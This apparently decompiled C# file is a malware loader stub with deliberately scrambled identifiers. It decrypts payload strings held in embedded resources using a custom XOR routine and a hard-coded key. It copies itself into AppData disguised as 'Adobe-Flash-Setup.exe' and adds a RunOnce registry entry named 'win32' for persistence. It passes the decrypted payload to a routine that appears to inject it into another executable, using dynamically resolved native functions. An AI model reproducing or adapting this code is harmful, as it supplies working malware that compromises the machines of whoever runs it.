using System;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ACRWWlmcEMMiLKC;

public class jPBtstVJHkaliCqMPiPToqgCCzzaqt
{
	public delegate IntPtr xEOOQosHdlUMdtG(IntPtr KUyxPhdBdRjFisc, IntPtr CHVLrNZXVuNucwn, uint FuxtTVVJXhUGowG, uint mrGQOWUXroLWCdc, uint LafPlNhQyhGXXDv);

	public delegate uint XESPQWznCdDbXLp(IntPtr KUyxPhdBdRjFisc, IntPtr gKApiwOmHrLxhdh);

	public delegate int txIWZchkKcCYqVo(IntPtr KUyxPhdBdRjFisc, IntPtr gKApiwOmHrLxhdh, IntPtr YtFVvTBylTfAhJh, uint ZXtUhbvoVFXOxyz, IntPtr pZMtiorciCElquc);

	public delegate int nLBXTXPHZoXrmKm(IntPtr VGCzrNemWgCeKqx, IntPtr fdaKDfOPATHUltB);

	public delegate int muVNRvegtEQuiMo(IntPtr VGCzrNemWgCeKqx, IntPtr fdaKDfOPATHUltB);

	public delegate uint XjtoPRyZSrDPIHc(IntPtr VGCzrNemWgCeKqx, IntPtr PfSTJqmXhLlNPmE);

	private static string[] pSJyyctxtdZwtihexKDAhchfsSJZRT = new string[1] { "mtqnFxedDEgjKOFAZyqt" };

	private static string RUtqVhAJenttPMTQYXvxcOvPkmLDfG = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string[] stFylfdcnZCOGriPnumBULDsQdyDfI;

	private static byte[] smethod_0(byte[] vWDxTXLqBONVKvUnieGuZqtCLGQnIi, byte[] FyXEDGkjwkdXTxOZbiyCUtWJIfEbLn)
	{
		byte[] array = (byte[])vWDxTXLqBONVKvUnieGuZqtCLGQnIi.Clone();
		for (int i = 0; i < 5; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				array[j] = (byte)(array[j] ^ FyXEDGkjwkdXTxOZbiyCUtWJIfEbLn[j % FyXEDGkjwkdXTxOZbiyCUtWJIfEbLn.Length]);
				for (int k = 0; k < FyXEDGkjwkdXTxOZbiyCUtWJIfEbLn.Length; k++)
				{
					array[j] = (byte)(array[j] ^ (((FyXEDGkjwkdXTxOZbiyCUtWJIfEbLn[k] << i) ^ k) + j));
				}
			}
		}
		return array;
	}

	public static string smethod_1(string hyHtipXgSodZHwrcwTOMEHNfnmBnVx, string bjwkcEpzqybVpkzVMztGHLmYHyKCgV)
	{
		byte[] bytes = smethod_0(smethod_2(hyHtipXgSodZHwrcwTOMEHNfnmBnVx), smethod_2(bjwkcEpzqybVpkzVMztGHLmYHyKCgV));
		return Encoding.Default.GetString(bytes);
	}

	private static byte[] smethod_2(string NJktnTBxuMMXCpLJsCErzcVoPpWyBC)
	{
		return Encoding.Default.GetBytes(NJktnTBxuMMXCpLJsCErzcVoPpWyBC);
	}

	private static void Main(string[] args)
	{
		smethod_3();
	}

	public static void smethod_3()
	{
		ResourceManager resourceManager = new ResourceManager("MgLyOoAHdcoXyUD", Assembly.GetExecutingAssembly());
		string @string = resourceManager.GetString("Ywjihiem");
		string string2 = resourceManager.GetString("AKsXcYk");
		string string3 = resourceManager.GetString("VzcWF");
		string string4 = resourceManager.GetString("eiNczo");
		resourceManager.GetString("mnzfPmXJQ");
		resourceManager.GetString("UpmiIH");
		string string5 = resourceManager.GetString("TlOuryJS");
		string bjwkcEpzqybVpkzVMztGHLmYHyKCgV = "'&#*&!(!()&&&%*)&(#''*'!'";
		@string = smethod_1(@string, bjwkcEpzqybVpkzVMztGHLmYHyKCgV);
		string2 = smethod_1(string2, bjwkcEpzqybVpkzVMztGHLmYHyKCgV);
		string3 = smethod_1(string3, bjwkcEpzqybVpkzVMztGHLmYHyKCgV);
		string4 = smethod_1(string4, bjwkcEpzqybVpkzVMztGHLmYHyKCgV);
		string5 = smethod_1(string5, bjwkcEpzqybVpkzVMztGHLmYHyKCgV);
		stFylfdcnZCOGriPnumBULDsQdyDfI = string5.Split(new char[1] { '|' });
		string executablePath = Application.get_ExecutablePath();
		if (!executablePath.Contains(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)))
		{
			byte[] bytes = File.ReadAllBytes(executablePath);
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Adobe-Flash-Setup.exe");
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, bytes);
			}
		}
		if (@string != string.Empty)
		{
			executablePath = stFylfdcnZCOGriPnumBULDsQdyDfI[0];
			string[] array = @string.Split(pSJyyctxtdZwtihexKDAhchfsSJZRT, StringSplitOptions.RemoveEmptyEntries);
			foreach (string nJktnTBxuMMXCpLJsCErzcVoPpWyBC in array)
			{
				try
				{
					WqtDhRRRQVqPpPlohxxgdmtBtYnkNr.smethod_0(smethod_2(nJktnTBxuMMXCpLJsCErzcVoPpWyBC), executablePath);
				}
				catch
				{
				}
			}
		}
		smethod_5();
	}

	private static int smethod_4(int XdVRSZEiDtYxFYXlWpufhZlDvMPCZa, int COqaIrsnNUfZsTZIBYSkOzAyPXRtuf)
	{
		Random random = new Random();
		return random.Next(XdVRSZEiDtYxFYXlWpufhZlDvMPCZa, COqaIrsnNUfZsTZIBYSkOzAyPXRtuf);
	}

	private static void smethod_5()
	{
		string name = "win32";
		string name2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce";
		try
		{
			string value = RUtqVhAJenttPMTQYXvxcOvPkmLDfG + "\\Adobe-Flash-Setup.exe";
			Registry.CurrentUser.OpenSubKey(name2, writable: true)!.SetValue(name, value);
		}
		catch
		{
		}
	}

	public static T smethod_6<T>(string kbjCRkhEpGSJAzZhFtENlQKOmcnRkL, string yaRIJeQQcPBWImrfZayIrzNHUsrtrO)
	{
		IntPtr yfGtFpDZvuqlJIWLLLddHQvsOtvqvE = WqtDhRRRQVqPpPlohxxgdmtBtYnkNr.LoadLibraryA(kbjCRkhEpGSJAzZhFtENlQKOmcnRkL);
		IntPtr procAddress = WqtDhRRRQVqPpPlohxxgdmtBtYnkNr.GetProcAddress(yfGtFpDZvuqlJIWLLLddHQvsOtvqvE, yaRIJeQQcPBWImrfZayIrzNHUsrtrO);
		return (T)(object)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(T));
	}
}
